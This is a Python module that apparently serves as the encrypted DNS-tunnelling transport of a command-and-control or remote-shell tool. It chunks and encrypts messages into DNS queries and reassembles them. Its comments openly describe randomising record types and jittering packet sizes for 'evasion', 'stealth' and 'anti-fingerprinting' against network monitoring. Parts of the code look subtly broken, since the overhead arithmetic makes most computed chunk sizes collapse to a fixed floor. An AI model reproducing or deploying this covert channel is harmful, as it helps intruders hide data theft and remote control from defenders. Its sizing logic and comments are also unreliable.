# lib/transport/encoding.py
import binascii
import random
import threading
from typing import Tuple, List, Optional

from lib.crypto.symetric import seal, open_sealed
from lib.protocol import comm_pb2
from lib.spliting.split import split, splits


# Thread-safe chunk management
_chunk_map = {}  # {chunk_id: {chunk_num: data}}
_sessions = {}   # {chunk_id: ChunkStart}
_current_chunk = 0
_chunk_lock = threading.Lock()  # Thread safety for concurrent access


class RecordType:
    """Enum for supported DNS record types."""
    TXT = 'TXT'
    A = 'A'
    AAAA = 'AAAA'
    MX = 'MX'
    CNAME = 'CNAME'


def decode(payload: str, encryption_key: str) -> Tuple[Optional[bytes], bool]:
    """
    Decode and decrypt a DNS payload, reassemble chunks if needed.
    
    Args:
        payload: Hex-encoded encrypted payload
        encryption_key: Hex-encoded encryption key
        
    Returns:
        Tuple of (output_bytes, complete_flag)
        - output_bytes: Decrypted data if complete, None otherwise
        - complete_flag: True if all chunks received and reassembled
    """
    try:
        # Decode the packet from hex
        data_packet_raw = binascii.unhexlify(payload)
    except (binascii.Error, ValueError):
        # Silent failure - don't spam logs with network noise
        return None, False
    
    # Check if the packet is big enough to fit the nonce (24 bytes)
    if len(data_packet_raw) < 24:
        return None, False
    
    # Extract nonce (first 24 bytes) and ciphertext (rest)
    nonce = data_packet_raw[:24]
    ciphertext = data_packet_raw[24:]
    
    # Authenticate and decrypt the packet
    output, valid = open_sealed(ciphertext, nonce, encryption_key)
    
    # Return early if invalid (silent)
    if not valid:
        return None, False
    
    # Parse the "Message" part of the Protocol buffer packet
    message = comm_pb2.Message()
    try:
        message.ParseFromString(output)
    except Exception:
        # Silent failure
        return None, False
    
    # Thread-safe chunk processing
    with _chunk_lock:
        # Process the message depending on its type
        if message.HasField('chunkstart'):
            # A chunkstart packet indicates we need to allocate memory to receive data
            chunk_id = message.chunkstart.chunkid
            _sessions[chunk_id] = message.chunkstart
            _chunk_map[chunk_id] = {}
            return None, False
        
        elif message.HasField('chunkdata'):
            chunk_id = message.chunkdata.chunkid
            
            # Check if we have a valid session from this chunk_id
            if chunk_id not in _sessions:
                return None, False
            
            # Fill the chunk_map with the data from the message
            chunk_num = message.chunkdata.chunknum
            _chunk_map[chunk_id][chunk_num] = message.chunkdata.packet
            
            # Check if we have successfully received all the packets
            expected_size = _sessions[chunk_id].chunksize
            if len(_chunk_map[chunk_id]) == expected_size:
                # Rebuild the final data in order
                chunk_buffer = bytearray()
                
                # Validate all chunks are present
                for i in range(expected_size):
                    if i not in _chunk_map[chunk_id]:
                        # Missing chunk - don't return incomplete data
                        return None, False
                    chunk_buffer.extend(_chunk_map[chunk_id][i])
                
                # Free some memory
                del _chunk_map[chunk_id]
                del _sessions[chunk_id]
                
                # Return the complete data
                return bytes(chunk_buffer), True
    
    return None, False


def dns_marshal(pb_message: comm_pb2.Message, encryption_key: str, 
                is_request: bool, record_type: str = 'TXT') -> str:
    """
    Marshal a protobuf message into an encrypted DNS-compatible format.
    Enhanced with multi-channel support and record type awareness.
    
    Args:
        pb_message: Protocol buffer message to marshal
        encryption_key: Hex-encoded encryption key
        is_request: True if this is a DNS request (requires subdomain splitting)
        record_type: Target DNS record type for optimal formatting
        
    Returns:
        Hex-encoded encrypted packet, formatted for specified record type
    """
    # Convert the Protobuf message to bytes
    packet = pb_message.SerializeToString()
    
    # Encrypt the message
    nonce, ciphertext = seal(packet, encryption_key)
    
    # Create the data packet containing the nonce and the data
    packet_buffer = bytearray()
    packet_buffer.extend(nonce)
    packet_buffer.extend(ciphertext)
    
    # Encode the final packet as hex
    packet_hex = binascii.hexlify(bytes(packet_buffer)).decode('ascii')
    
    # If this is a DNS Request, format based on record type
    # Different record types have different optimal label lengths
    if is_request:
        if record_type == RecordType.A:
            # A records: shorter labels (32 chars) for better IPv4 encoding
            packet_hex = '.'.join(splits(packet_hex, 32))
        elif record_type == RecordType.AAAA:
            # AAAA records: 32 chars for IPv6 encoding efficiency
            packet_hex = '.'.join(splits(packet_hex, 32))
        elif record_type == RecordType.TXT:
            # TXT records: standard 63 char labels (max subdomain length)
            packet_hex = '.'.join(splits(packet_hex, 63))
        elif record_type == RecordType.MX:
            # MX records: medium labels (48 chars) for mail server format
            packet_hex = '.'.join(splits(packet_hex, 48))
        elif record_type == RecordType.CNAME:
            # CNAME records: medium labels (48 chars) for canonical names
            packet_hex = '.'.join(splits(packet_hex, 48))
        else:
            # Default to TXT format for unknown types
            packet_hex = '.'.join(splits(packet_hex, 63))
    
    return packet_hex


def encode(payload: bytes, is_request: bool, encryption_key: str, 
           target_domain: str, client_guid: bytes, record_type: str = None) -> Tuple[Tuple[str, str], List[Tuple[str, str]]]:
    """
    Encode payload into DNS packets with chunking support.
    Enhanced with multi-channel support and anti-fingerprinting.
    
    Args:
        payload: Raw bytes to send
        is_request: True if this is a DNS request
        encryption_key: Hex-encoded encryption key
        target_domain: Target domain for DNS queries
        client_guid: Client GUID (16 bytes)
        record_type: Preferred DNS record type (None for auto-select)
        
    Returns:
        Tuple of ((init_packet, init_record_type), [(data_packet, record_type), ...])
    """
    global _current_chunk
    
    # Auto-select record type if not specified
    if record_type is None:
        record_type = _select_encode_record_type(len(payload))
    
    # Calculate optimal chunk size based on record type
    chunk_size = _get_optimal_chunk_size(record_type, target_domain, client_guid)
    
    # Chunk the payload
    packets = split(payload, chunk_size)
    
    # Thread-safe chunk ID increment
    with _chunk_lock:
        _current_chunk += 1
        chunk_id = _current_chunk
    
    # Generate the init packet, containing information about the number of chunks
    init_message = comm_pb2.Message(
        clientguid=client_guid,
        chunkstart=comm_pb2.ChunkStart(
            chunkid=chunk_id,
            chunksize=len(packets)
        )
    )
    
    # Transform the protobuf packet into an encrypted DNS packet
    init_packet = dns_marshal(init_message, encryption_key, is_request, record_type)
    
    # List to store all data packets with their record types
    data_packets = []
    
    # Iterate over every chunk
    for chunk_num, packet_data in enumerate(packets):
        # Optionally vary record type per chunk for enhanced evasion
        chunk_record_type = _maybe_vary_record_type(record_type, chunk_num, len(packets))
        
        # Generate the "data" packet, containing the current chunk information and data
        data_message = comm_pb2.Message(
            clientguid=client_guid,
            chunkdata=comm_pb2.ChunkData(
                chunkid=chunk_id,
                chunknum=chunk_num,
                packet=packet_data
            )
        )
        
        # Transform the protobuf packet into an encrypted DNS packet
        data_packet = dns_marshal(data_message, encryption_key, is_request, chunk_record_type)
        data_packets.append((data_packet, chunk_record_type))
    
    return (init_packet, record_type), data_packets


def _select_encode_record_type(payload_length: int) -> str:
    """
    Intelligently select record type based on payload size.
    
    Strategy:
    - Large payloads (>500 bytes): Prefer TXT (high capacity)
    - Medium payloads (100-500 bytes): Mix of TXT, MX, CNAME
    - Small payloads (<100 bytes): Prefer A/AAAA for stealth, TXT for reliability
    
    Args:
        payload_length: Size of payload in bytes
        
    Returns:
        Selected record type string
    """
    rand = random.random()
    
    if payload_length > 500:
        # Large data - prefer TXT for capacity
        if rand < 0.75:
            return RecordType.TXT
        elif rand < 0.9:
            return RecordType.MX
        else:
            return RecordType.CNAME
    
    elif payload_length > 100:
        # Medium data - balanced mix for evasion
        weights = [0.4, 0.15, 0.15, 0.15, 0.15]  # TXT, A, AAAA, MX, CNAME
        types = [RecordType.TXT, RecordType.A, RecordType.AAAA, RecordType.MX, RecordType.CNAME]
        return random.choices(types, weights=weights)[0]
    
    else:
        # Small data - prefer compact types
        if rand < 0.35:
            return RecordType.A
        elif rand < 0.65:
            return RecordType.AAAA
        elif rand < 0.85:
            return RecordType.TXT
        elif rand < 0.925:
            return RecordType.MX
        else:
            return RecordType.CNAME


def _get_optimal_chunk_size(record_type: str, target_domain: str, client_guid: bytes) -> int:
    """
    Calculate optimal chunk size based on record type and overhead.
    
    Different record types have different encoding efficiencies:
    - TXT: High capacity (up to 255 chars per string)
    - A: Low capacity (4 bytes per IPv4)
    - AAAA: Medium capacity (16 bytes per IPv6)
    - MX/CNAME: Medium capacity (subdomain encoding)
    
    Args:
        record_type: DNS record type
        target_domain: Target domain (for overhead calculation)
        client_guid: Client GUID (for overhead calculation)
        
    Returns:
        Optimal chunk size in bytes
    """
    # Calculate base overhead from domain and GUID
    base_overhead = len(target_domain) + len(client_guid) + (24 * 2)  # nonce overhead
    
    # Record type specific capacity limits
    # These are conservative estimates to ensure reliability
    capacity_limits = {
        RecordType.TXT: 240 // 2,    # ~120 bytes (hex encoding doubles size)
        RecordType.A: 32 // 2,        # ~16 bytes (4 bytes per IP, multiple IPs possible)
        RecordType.AAAA: 64 // 2,     # ~32 bytes (16 bytes per IP)
        RecordType.MX: 180 // 2,      # ~90 bytes (subdomain encoding)
        RecordType.CNAME: 180 // 2    # ~90 bytes (subdomain encoding)
    }
    
    max_chunk = capacity_limits.get(record_type, 120) - base_overhead
    
    # Add small random jitter to chunk size (±5% for anti-fingerprinting)
    # This varies packet sizes slightly without breaking functionality
    jitter = int(max_chunk * random.uniform(-0.05, 0.05))
    adaptive_chunk_size = max(50, max_chunk + jitter)
    
    return adaptive_chunk_size


def _maybe_vary_record_type(base_type: str, chunk_num: int, total_chunks: int) -> str:
    """
    Optionally vary record type per chunk for enhanced evasion.
    
    Strategy:
    - 80% of time: use base type (consistency)
    - 20% of time: switch to compatible type (diversity)
    - Never switch on first/last chunk (protocol reliability)
    
    Args:
        base_type: Primary record type for this payload
        chunk_num: Current chunk number
        total_chunks: Total number of chunks
        
    Returns:
        Record type to use for this chunk
    """
    # Always use base type for first and last chunks (reliability)
    if chunk_num == 0 or chunk_num == total_chunks - 1:
        return base_type
    
    # 20% chance to vary record type on middle chunks
    if random.random() < 0.2:
        # Define compatible alternative types for each base type
        alternatives = {
            RecordType.TXT: [RecordType.MX, RecordType.CNAME],
            RecordType.A: [RecordType.AAAA, RecordType.TXT],
            RecordType.AAAA: [RecordType.A, RecordType.TXT],
            RecordType.MX: [RecordType.TXT, RecordType.CNAME],
            RecordType.CNAME: [RecordType.TXT, RecordType.MX]
        }
        
        possible_types = alternatives.get(base_type, [RecordType.TXT])
        if possible_types:
            return random.choice(possible_types)
    
    return base_type


def get_encoding_stats() -> dict:
    """
    Get statistics about current encoding state.
    Useful for monitoring and debugging.
    
    Returns:
        Dictionary with encoding statistics
    """
    with _chunk_lock:
        return {
            'active_chunks': len(_chunk_map),
            'active_sessions': len(_sessions),
            'total_chunks_created': _current_chunk,
            'chunks_detail': {
                chunk_id: {
                    'received': len(chunks),
                    'expected': _sessions[chunk_id].chunksize if chunk_id in _sessions else 0
                }
                for chunk_id, chunks in _chunk_map.items()
            }
        }


def reset_encoding_state():
    """
    Reset encoding state (useful for testing or recovery).
    Warning: This will drop all incomplete chunks!
    """
    global _current_chunk
    with _chunk_lock:
        _chunk_map.clear()
        _sessions.clear()
        _current_chunk = 0
